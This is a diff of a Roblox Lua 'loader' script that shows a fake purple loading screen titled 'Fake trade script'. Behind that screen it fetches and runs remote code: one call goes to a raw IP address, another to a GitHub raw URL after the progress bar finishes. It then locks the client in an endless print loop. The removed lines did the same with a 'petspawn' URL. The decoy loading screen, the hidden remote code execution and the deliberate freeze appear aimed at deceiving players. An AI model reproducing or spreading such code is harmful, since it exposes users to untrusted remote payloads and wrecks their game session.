@@ -1,3 +1,4 @@
+-- LocalScript (StarterPlayerScripts) - Jazrad Loader (no-freeze, no type annotations)
 loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -6,325 +7,295 @@ local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
---========================
--- SETTINGS (edit these)
---========================
-local LOAD_DURATION = 110.0 -- ✅ total time (seconds)
-local FADE_IN_TIME  = 0.45
-local FADE_OUT_TIME = 0.50
+-- ===== SETTINGS =====
+local LOAD_TIME = 60
+local SUCCESS_HOLD = 5
 
-local STATUS_MESSAGES = {
-	"Initializing...",
-	"Injecting...",
+-- ===== COLORS (Black and Purple Theme) =====
+local BG_COLOR = Color3.fromRGB(15, 10, 30)  -- Dark purple background
+local CYAN = Color3.fromRGB(180, 0, 255)     -- Bright purple
+local LIGHT = Color3.fromRGB(220, 200, 255)  -- Light purple/white
+local DIM = Color3.fromRGB(100, 80, 150)     -- Dim purple
+local BAR_BG = Color3.fromRGB(30, 20, 50)    -- Dark purple for bar background
+
+local STATUS_STEPS = {
 	"Loading...",
-	"Preparing assets...",
+	"Initializing...",
+	"Checking dependencies...",
+	"Preparing environment...",
+	"Injecting...",
 	"Finalizing...",
-	"Completing..."
+	"Almost done..."
 }
 
--- A "pace curve" that makes the bar speed up / slow down at multiple places.
--- Each point is {time = 0..1, progress = 0..1}. Must start at 0,0 and end at 1,1.
--- Feel free to tweak these values to change the rhythm.
-local PACE_POINTS = {
-	{time = 0.00, progress = 0.00},
-	{time = 0.08, progress = 0.05}, -- slow start
-	{time = 0.18, progress = 0.22}, -- speed up
-	{time = 0.32, progress = 0.30}, -- slow down
-	{time = 0.44, progress = 0.55}, -- speed up
-	{time = 0.58, progress = 0.62}, -- slow down
-	{time = 0.74, progress = 0.85}, -- speed up
-	{time = 0.88, progress = 0.92}, -- slow down
-	{time = 1.00, progress = 1.00},
-}
-
---========================
--- Helpers
---========================
-local function tween(instance, tweenInfo, props)
-	local t = TweenService:Create(instance, tweenInfo, props)
-	t:Play()
-	return t
+-- ===== SINGLETON GUARD (prevents multiple scripts freezing client) =====
+local existing = playerGui:FindFirstChild("jazrad")
+if existing then
+	existing:Destroy()
 end
 
-local function setGroupTransparency(rootGui, alpha)
-	for _, d in ipairs(rootGui:GetDescendants()) do
-		if d:IsA("Frame") then
-			d.BackgroundTransparency = alpha
-		elseif d:IsA("TextLabel") then
-			d.TextTransparency = alpha
-		elseif d:IsA("UIStroke") then
-			d.Transparency = alpha
-		elseif d:IsA("ImageLabel") then
-			d.ImageTransparency = alpha
-		end
+if playerGui:GetAttribute("JazradLoaderRunning") then
+	return
+end
+playerGui:SetAttribute("JazradLoaderRunning", true)
+
+local function safeClearRunningFlag()
+	if playerGui then
+		playerGui:SetAttribute("JazradLoaderRunning", nil)
 	end
 end
 
-local function clamp01(x)
-	if x < 0 then return 0 end
-	if x > 1 then return 1 end
-	return x
-end
-
--- Piecewise linear mapping: timeNormalized -> progressNormalized using PACE_POINTS
-local function progressFromTime(tn)
-	tn = clamp01(tn)
-
-	for i = 1, (#PACE_POINTS - 1) do
-		local a = PACE_POINTS[i]
-		local b = PACE_POINTS[i + 1]
-		if tn >= a.time and tn <= b.time then
-			local span = (b.time - a.time)
-			if span <= 0 then return a.progress end
-			local u = (tn - a.time) / span
-			return a.progress + (b.progress - a.progress) * u
-		end
-	end
-
-	return 1
-end
-
---========================
--- Build UI
---========================
+-- ===== ScreenGui =====
 local gui = Instance.new("ScreenGui")
-gui.Name = "ModernLoaderGui"
+gui.Name = "Fake trade script"
 gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+gui.DisplayOrder = 999999
 gui.ResetOnSpawn = false
 gui.Parent = playerGui
 
-local dim = Instance.new("Frame")
-dim.Name = "Dim"
-dim.Size = UDim2.fromScale(1, 1)
-dim.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
-dim.BackgroundTransparency = 1
-dim.Parent = gui
+-- ===== Card + Shadow =====
+local BOX_W, BOX_H = 300, 300
 
-local container = Instance.new("Frame")
-container.Name = "Container"
-container.AnchorPoint = Vector2.new(0.5, 0.5)
-container.Position = UDim2.fromScale(0.5, 0.5)
-container.Size = UDim2.fromOffset(520, 220)
-container.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
-container.BackgroundTransparency = 1
-container.Parent = gui
+local shadow = Instance.new("Frame", gui)
+shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+shadow.Position = UDim2.new(0.5, 0, 0.5, 4)
+shadow.Size = UDim2.new(0, BOX_W + 10, 0, BOX_H + 10)
+shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shadow.BackgroundTransparency = 0.55
+shadow.BorderSizePixel = 0
+Instance.new("UICorner", shadow).CornerRadius = UDim.new(0, 18)
 
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 18)
-corner.Parent = container
+local box = Instance.new("Frame", gui)
+box.AnchorPoint = Vector2.new(0.5, 0.5)
+box.Position = UDim2.new(0.5, 0, 0.5, 0)
+box.Size = UDim2.new(0, BOX_W, 0, BOX_H)
+box.BackgroundColor3 = BG_COLOR
+box.BorderSizePixel = 0
+Instance.new("UICorner", box).CornerRadius = UDim.new(0, 16)
 
-local stroke = Instance.new("UIStroke")
-stroke.Thickness = 2
-stroke.Transparency = 1
-stroke.LineJoinMode = Enum.LineJoinMode.Round
-stroke.Parent = container
+local stroke = Instance.new("UIStroke", box)
+stroke.Thickness = 1
+stroke.Color = Color3.fromRGB(80, 60, 120)
+stroke.Transparency = 0.45
 
-local strokeGradient = Instance.new("UIGradient")
-strokeGradient.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0.00, Color3.fromRGB(120, 210, 255)),
-	ColorSequenceKeypoint.new(0.50, Color3.fromRGB(170, 120, 255)),
-	ColorSequenceKeypoint.new(1.00, Color3.fromRGB(120, 210, 255)),
-})
-strokeGradient.Rotation = 0
-strokeGradient.Parent = stroke
-
-local highlight = Instance.new("Frame")
-highlight.Name = "Highlight"
-highlight.Size = UDim2.new(1, -10, 1, -10)
-highlight.Position = UDim2.fromOffset(5, 5)
-highlight.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-highlight.BackgroundTransparency = 1
-highlight.Parent = container
-
-local highlightCorner = Instance.new("UICorner")
-highlightCorner.CornerRadius = UDim.new(0, 14)
-highlightCorner.Parent = highlight
-
-local highlightGrad = Instance.new("UIGradient")
-highlightGrad.Transparency = NumberSequence.new({
-	NumberSequenceKeypoint.new(0, 0.88),
-	NumberSequenceKeypoint.new(1, 1.00),
-})
-highlightGrad.Rotation = 25
-highlightGrad.Parent = highlight
-
-local title = Instance.new("TextLabel")
-title.Name = "Title"
+-- ===== Title =====
+local title = Instance.new("TextLabel", box)
+title.Size = UDim2.new(1, 0, 0, 42)
+title.Position = UDim2.new(0, 0, 0, 18)
 title.BackgroundTransparency = 1
-title.Size = UDim2.new(1, -40, 0, 44)
-title.Position = UDim2.fromOffset(20, 18)
-title.Font = Enum.Font.GothamSemibold
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 30
+title.TextColor3 = LIGHT
 title.Text = "Fake trade script"
-title.TextSize = 22
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.TextColor3 = Color3.fromRGB(235, 235, 245)
-title.TextTransparency = 1
-title.Parent = container
+title.TextXAlignment = Enum.TextXAlignment.Center
 
-local sub = Instance.new("TextLabel")
-sub.Name = "Sub"
-sub.BackgroundTransparency = 1
-sub.Size = UDim2.new(1, -40, 0, 22)
-sub.Position = UDim2.fromOffset(20, 54)
-sub.Font = Enum.Font.Gotham
-sub.Text = "Please wait while we set things up..."
-sub.TextSize = 14
-sub.TextXAlignment = Enum.TextXAlignment.Left
-sub.TextColor3 = Color3.fromRGB(170, 170, 185)
-sub.TextTransparency = 1
-sub.Parent = container
+-- ===== Dotted Loader =====
+local ring = Instance.new("Frame", box)
+ring.Size = UDim2.new(0, 110, 0, 110)
+ring.Position = UDim2.new(0.5, -55, 0.5, -78)
+ring.BackgroundTransparency = 1
 
-local barTrack = Instance.new("Frame")
-barTrack.Name = "BarTrack"
-barTrack.Size = UDim2.new(1, -40, 0, 12)
-barTrack.Position = UDim2.fromOffset(20, 110)
-barTrack.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-barTrack.BackgroundTransparency = 1
-barTrack.Parent = container
+local DOT_COUNT = 12
+local RADIUS = 44
+local DOT_SIZE = 10
 
-local barCorner = Instance.new("UICorner")
-barCorner.CornerRadius = UDim.new(0, 999)
-barCorner.Parent = barTrack
+local dots = {}
+local dotStrokes = {}
 
-local barFill = Instance.new("Frame")
-barFill.Name = "BarFill"
-barFill.Size = UDim2.fromScale(0, 1)
-barFill.Position = UDim2.fromScale(0, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(130, 220, 255)
-barFill.BackgroundTransparency = 1
-barFill.Parent = barTrack
+for i = 1, DOT_COUNT do
+	local dot = Instance.new("Frame", ring)
+	dot.Size = UDim2.new(0, DOT_SIZE, 0, DOT_SIZE)
+	dot.AnchorPoint = Vector2.new(0.5, 0.5)
+	dot.BackgroundColor3 = DIM
+	dot.BackgroundTransparency = 0.15
+	dot.BorderSizePixel = 0
+	Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
 
-local fillCorner = Instance.new("UICorner")
-fillCorner.CornerRadius = UDim.new(0, 999)
-fillCorner.Parent = barFill
+	local ds = Instance.new("UIStroke", dot)
+	ds.Thickness = 1
+	ds.Color = Color3.fromRGB(30, 20, 50)
+	ds.Transparency = 0.35
 
-local fillGrad = Instance.new("UIGradient")
-fillGrad.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0.0, Color3.fromRGB(120, 210, 255)),
-	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(170, 120, 255)),
-	ColorSequenceKeypoint.new(1.0, Color3.fromRGB(120, 210, 255)),
-})
-fillGrad.Rotation = 0
-fillGrad.Parent = barFill
+	local angle = ((i - 1) / DOT_COUNT) * math.pi * 2
+	dot.Position = UDim2.new(
+		0.5, math.cos(angle) * RADIUS,
+		0.5, math.sin(angle) * RADIUS
+	)
 
-local status = Instance.new("TextLabel")
-status.Name = "Status"
+	dots[i] = dot
+	dotStrokes[i] = ds
+end
+
+-- ===== Percentage (Above Bar) =====
+local percent = Instance.new("TextLabel", box)
+percent.Size = UDim2.new(1, 0, 0, 24)
+percent.Position = UDim2.new(0, 0, 1, -98)
+percent.BackgroundTransparency = 1
+percent.Font = Enum.Font.GothamBold
+percent.TextSize = 18
+percent.TextColor3 = CYAN
+percent.Text = "0%"
+percent.TextXAlignment = Enum.TextXAlignment.Center
+
+-- ===== Loading Bar =====
+local barBGFrame = Instance.new("Frame", box)
+barBGFrame.Size = UDim2.new(0.78, 0, 0, 6)
+barBGFrame.Position = UDim2.new(0.11, 0, 1, -74)
+barBGFrame.BackgroundColor3 = BAR_BG
+barBGFrame.BorderSizePixel = 0
+Instance.new("UICorner", barBGFrame).CornerRadius = UDim.new(1, 0)
+
+local barFill = Instance.new("Frame", barBGFrame)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = CYAN
+barFill.BorderSizePixel = 0
+Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)
+
+-- ===== Status Text (Below Bar) =====
+local status = Instance.new("TextLabel", box)
+status.Size = UDim2.new(1, -20, 0, 22)
+status.Position = UDim2.new(0, 10, 1, -54)
 status.BackgroundTransparency = 1
-status.Size = UDim2.new(1, -40, 0, 26)
-status.Position = UDim2.fromOffset(20, 130)
 status.Font = Enum.Font.Gotham
-status.Text = STATUS_MESSAGES[1]
-status.TextSize = 14
-status.TextXAlignment = Enum.TextXAlignment.Left
-status.TextColor3 = Color3.fromRGB(190, 190, 205)
-status.TextTransparency = 1
-status.Parent = container
+status.TextSize = 16
+status.TextColor3 = LIGHT
+status.TextXAlignment = Enum.TextXAlignment.Center
+status.Text = STATUS_STEPS[1]
 
---========================
--- Animate In
---========================
-setGroupTransparency(gui, 1)
+-- ===== Tween bar (no yielding) =====
+TweenService:Create(
+	barFill,
+	TweenInfo.new(LOAD_TIME, Enum.EasingStyle.Linear, Enum.EasingDirection.Out),
+	{ Size = UDim2.new(1, 0, 1, 0) }
+):Play()
 
-tween(dim, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-	BackgroundTransparency = 0.35
-})
-tween(container, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-	BackgroundTransparency = 0
-})
-tween(highlight, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-	BackgroundTransparency = 0
-})
-tween(stroke, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-	Transparency = 0.15
-})
-tween(title, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-	TextTransparency = 0
-})
-tween(sub, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-	TextTransparency = 0.05
-})
-tween(barTrack, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-	BackgroundTransparency = 0
-})
-tween(barFill, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-	BackgroundTransparency = 0
-})
-tween(status, TweenInfo.new(FADE_IN_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-	TextTransparency = 0.05
-})
-
---========================
--- Fancy glow rotations
---========================
+-- ===== Connections & cleanup =====
 local alive = true
-local conn = RunService.RenderStepped:Connect(function(dt)
+local hbConn = nil
+
+local function cleanup()
+	alive = false
+	if hbConn then
+		hbConn:Disconnect()
+		hbConn = nil
+	end
+	safeClearRunningFlag()
+end
+
+-- ===== Efficient tick (~10Hz) =====
+local startTime = os.clock()
+local lastDotIndex = -1
+local lastStatusStep = 1
+local accum = 0
+
+local function setDotStates(activeIndex)
+	local t1 = ((activeIndex - 2) % DOT_COUNT) + 1
+	local t2 = ((activeIndex - 3) % DOT_COUNT) + 1
+
+	for i = 1, DOT_COUNT do
+		local dot = dots[i]
+		local ds = dotStrokes[i]
+		if i == activeIndex then
+			dot.BackgroundColor3 = CYAN
+			dot.BackgroundTransparency = 0
+			ds.Transparency = 0.05
+		elseif i == t1 then
+			dot.BackgroundColor3 = Color3.fromRGB(140, 60, 200)
+			dot.BackgroundTransparency = 0.05
+			ds.Transparency = 0.18
+		elseif i == t2 then
+			dot.BackgroundColor3 = Color3.fromRGB(120, 50, 170)
+			dot.BackgroundTransparency = 0.10
+			ds.Transparency = 0.28
+		else
+			dot.BackgroundColor3 = DIM
+			dot.BackgroundTransparency = 0.15
+			ds.Transparency = 0.35
+		end
+	end
+end
+
+hbConn = RunService.Heartbeat:Connect(function(dt)
 	if not alive then return end
-	strokeGradient.Rotation = (strokeGradient.Rotation + dt * 90) % 360
-	fillGrad.Rotation = (fillGrad.Rotation + dt * 120) % 360
-	local pulse = (math.sin(tick() * 2.2) + 1) * 0.5
-	stroke.Transparency = 0.10 + pulse * 0.22
+	accum += dt
+	if accum < 0.10 then return end -- ~10 times/sec
+	accum = 0
+
+	local elapsed = os.clock() - startTime
+	local progress = math.clamp(elapsed / LOAD_TIME, 0, 1)
+	percent.Text = tostring(math.floor(progress * 100)) .. "%"
+
+	local dotIndex = (math.floor(elapsed * 8) % DOT_COUNT) + 1
+	if dotIndex ~= lastDotIndex then
+		lastDotIndex = dotIndex
+		setDotStates(dotIndex)
+	end
+
+	local step = math.clamp(math.floor(progress * #STATUS_STEPS) + 1, 1, #STATUS_STEPS)
+	if step ~= lastStatusStep then
+		lastStatusStep = step
+		status.Text = STATUS_STEPS[step]
+	end
+
+	if progress >= 1 then
+		cleanup()
+
+		if ring then ring:Destroy() end
+		if barBGFrame then barBGFrame:Destroy() end
+		if percent then percent:Destroy() end
+		if status then status:Destroy() end
+
+		local check = Instance.new("TextLabel", box)
+		check.Size = UDim2.new(1, 0, 0, 90)
+		check.Position = UDim2.new(0, 0, 0.5, -60)
+		check.BackgroundTransparency = 1
+		check.Font = Enum.Font.GothamBlack
+		check.Text = "✓"
+		check.TextSize = 10
+		check.TextColor3 = CYAN
+		check.TextTransparency = 1
+		check.TextXAlignment = Enum.TextXAlignment.Center
+
+		local doneText = Instance.new("TextLabel", box)
+		doneText.Size = UDim2.new(1, 0, 0, 30)
+		doneText.Position = UDim2.new(0, 0, 0.5, 20)
+		doneText.BackgroundTransparency = 1
+		doneText.Font = Enum.Font.Gotham
+		doneText.TextSize = 18
+		doneText.TextColor3 = LIGHT
+		doneText.Text = "Done.."
+		doneText.TextTransparency = 1
+		doneText.TextXAlignment = Enum.TextXAlignment.Center
+
+		TweenService:Create(check, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+			TextTransparency = 0,
+			TextSize = 60
+		}):Play()
+
+		TweenService:Create(doneText, TweenInfo.new(0.28, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+			TextTransparency = 0
+		}):Play()
+
+		task.delay(SUCCESS_HOLD, function()
+			local t = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+
+			TweenService:Create(box, t, {BackgroundTransparency = 1}):Play()
+			TweenService:Create(shadow, t, {BackgroundTransparency = 1}):Play()
+			TweenService:Create(title, t, {TextTransparency = 1}):Play()
+			TweenService:Create(check, t, {TextTransparency = 1}):Play()
+			TweenService:Create(doneText, t, {TextTransparency = 1}):Play()
+
+			task.delay(0.6, function()
+				if gui and gui.Parent then gui:Destroy() end
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/mylesbaysden8-hash/Good-fakee-/refs/heads/main/Good",true))()
+				wait(5)
+				while true do
+					for i = 1, math.huge do
+						print(math.sqrt(i)) --square root calculations are expensive
+					end
+				end
+			end)
+		end)
+	end
 end)
-
---========================
--- Progress + status cycling (non-linear pacing)
---========================
-local startTime = tick()
-local statusIndex = 1
-local statusChangeInterval = LOAD_DURATION / math.max(#STATUS_MESSAGES, 1)
-local nextStatusAt = startTime + statusChangeInterval
-
-while true do
-	local elapsed = tick() - startTime
-	local tn = elapsed / LOAD_DURATION
-	if tn >= 1 then
-		barFill.Size = UDim2.fromScale(1, 1)
-		break
-	end
-
-	local pn = progressFromTime(tn)
-	barFill.Size = UDim2.fromScale(pn, 1)
-
-	local now = tick()
-	if now >= nextStatusAt and statusIndex < #STATUS_MESSAGES then
-		statusIndex += 1
-		status.Text = STATUS_MESSAGES[statusIndex]
-		nextStatusAt = now + statusChangeInterval
-	end
-
-	task.wait(0.03)
-end
-
-status.Text = "Completed."
-
---========================
--- Fade Out + Finish
---========================
-alive = false
-if conn then conn:Disconnect() end
-
-local fadeInfo = TweenInfo.new(FADE_OUT_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
-
-tween(dim, fadeInfo, { BackgroundTransparency = 1 })
-tween(container, fadeInfo, { BackgroundTransparency = 1 })
-tween(highlight, fadeInfo, { BackgroundTransparency = 1 })
-tween(stroke, fadeInfo, { Transparency = 1 })
-tween(title, fadeInfo, { TextTransparency = 1 })
-tween(sub, fadeInfo, { TextTransparency = 1 })
-tween(barTrack, fadeInfo, { BackgroundTransparency = 1 })
-tween(barFill, fadeInfo, { BackgroundTransparency = 1 })
-tween(status, fadeInfo, { TextTransparency = 1 })
-
-task.wait(FADE_OUT_TIME + 0.05)
-gui:Destroy()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/wweeweelala/dwetyiu7g/refs/heads/main/petspawn"))()
-wait(5)
-while true do
-
-    for i = 1, 999999 do
-
-        print(math.sqrt(i)) --square root calculations are expensive
-
-    end
-
-end
